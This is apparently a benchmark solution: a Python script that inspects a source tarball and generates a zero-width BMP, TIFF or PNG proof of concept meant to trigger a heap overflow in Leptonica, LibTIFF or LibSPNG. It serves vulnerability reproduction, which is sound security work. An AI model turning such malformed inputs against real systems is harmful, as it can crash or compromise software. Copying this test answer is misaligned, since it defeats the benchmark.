import tarfile
import struct
import zlib
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Logic:
        1. Inspects the source tarball to identify the target library (Leptonica, LibTIFF, LibSPNG).
        2. Based on the identification, generates a specific malformed image file.
        3. The vulnerability "zero width or height images are not checked" typically affects
           libraries like Leptonica (BMP/PNM processing) or sometimes LibTIFF/LibSPNG.
           The OSS-Fuzz ID 42536 matches a Leptonica BMP vulnerability.
        """
        
        is_leptonica = False
        is_tiff = False
        is_png = False
        
        # Identify the project from the tarball contents
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar.getmembers():
                    name = member.name.lower()
                    if 'leptonica' in name or 'pix.h' in name:
                        is_leptonica = True
                        break
                    if 'libtiff' in name or 'tif_dir' in name:
                        is_tiff = True
                    if 'libspng' in name or 'spng.h' in name:
                        is_png = True
        except Exception:
            # If inspection fails, default to Leptonica/BMP as per the problem ID hint
            pass

        # Prioritize Leptonica detection as ID 42536 is associated with it
        if is_leptonica or (not is_tiff and not is_png):
            # Generate BMP with 0 width
            # Vulnerability: Heap Buffer Overflow due to unchecked dimensions (Width=0)
            
            width = 0
            height = 128
            bpp = 24
            
            file_header_size = 14
            info_header_size = 40
            offset_to_data = file_header_size + info_header_size
            
            # Payload size - arbitrary, but enough to cause issues if accessed
            data_size = 2048
            file_size = offset_to_data + data_size
            
            bmp = bytearray()
            
            # 1. BMP File Header
            bmp.extend(b'BM')
            bmp.extend(file_size.to_bytes(4, 'little'))
            bmp.extend(b'\x00\x00\x00\x00') # Reserved
            bmp.extend(offset_to_data.to_bytes(4, 'little'))
            
            # 2. DIB Header (BITMAPINFOHEADER)
            bmp.extend(info_header_size.to_bytes(4, 'little'))
            bmp.extend(width.to_bytes(4, 'little', signed=True))  # TRIGGER: Width = 0
            bmp.extend(height.to_bytes(4, 'little', signed=True))
            bmp.extend((1).to_bytes(2, 'little')) # Planes
            bmp.extend(bpp.to_bytes(2, 'little')) # BitCount
            bmp.extend((0).to_bytes(4, 'little')) # Compression (BI_RGB)
            bmp.extend((0).to_bytes(4, 'little')) # ImageSize
            bmp.extend((0).to_bytes(4, 'little')) # XPixelsPerMeter
            bmp.extend((0).to_bytes(4, 'little')) # YPixelsPerMeter
            bmp.extend((0).to_bytes(4, 'little')) # ClrUsed
            bmp.extend((0).to_bytes(4, 'little')) # ClrImportant
            
            # 3. Pixel Data
            bmp.extend(b'\x41' * data_size)
            
            return bytes(bmp)

        if is_tiff:
            # Generate TIFF with 0 width
            # Header: Little Endian
            tif = bytearray(b'II\x2a\x00')
            # Offset to first IFD: 8
            tif.extend((8).to_bytes(4, 'little'))
            
            # IFD
            # Entry count: 2 (Width, Length to be minimal)
            # Actually need more to be valid TIFF
            num_entries = 4
            tif.extend(num_entries.to_bytes(2, 'little'))
            
            # Helper to add entry
            def add_tag(tag, type_, count, val):
                t = bytearray()
                t.extend(tag.to_bytes(2, 'little'))
                t.extend(type_.to_bytes(2, 'little'))
                t.extend(count.to_bytes(4, 'little'))
                t.extend(val.to_bytes(4, 'little'))
                return t
            
            # ImageWidth (256): 0
            tif.extend(add_tag(256, 3, 1, 0))
            # ImageLength (257): 10
            tif.extend(add_tag(257, 3, 1, 10))
            # BitsPerSample (258): 8
            tif.extend(add_tag(258, 3, 1, 8))
            # PhotometricInterpretation (262): 1 (BlackIsZero)
            tif.extend(add_tag(262, 3, 1, 1))
            
            # Next IFD: 0
            tif.extend((0).to_bytes(4, 'little'))
            
            return bytes(tif)

        if is_png:
            # Generate PNG with 0 width
            png = bytearray(b'\x89PNG\r\n\x1a\n')
            
            # IHDR Chunk
            ihdr_data = bytearray()
            ihdr_data.extend((0).to_bytes(4, 'big')) # Width = 0
            ihdr_data.extend((10).to_bytes(4, 'big')) # Height = 10
            ihdr_data.extend(b'\x08\x02\x00\x00\x00') # Depth 8, Color Type 2 (RGB)
            
            png.extend(len(ihdr_data).to_bytes(4, 'big'))
            png.extend(b'IHDR')
            png.extend(ihdr_data)
            png.extend(zlib.crc32(b'IHDR' + ihdr_data).to_bytes(4, 'big'))
            
            # IDAT Chunk (Empty)
            png.extend((0).to_bytes(4, 'big'))
            png.extend(b'IDAT')
            png.extend(zlib.crc32(b'IDAT').to_bytes(4, 'big'))
            
            # IEND Chunk
            png.extend((0).to_bytes(4, 'big'))
            png.extend(b'IEND')
            png.extend(zlib.crc32(b'IEND').to_bytes(4, 'big'))
            
            return bytes(png)
            
        return b''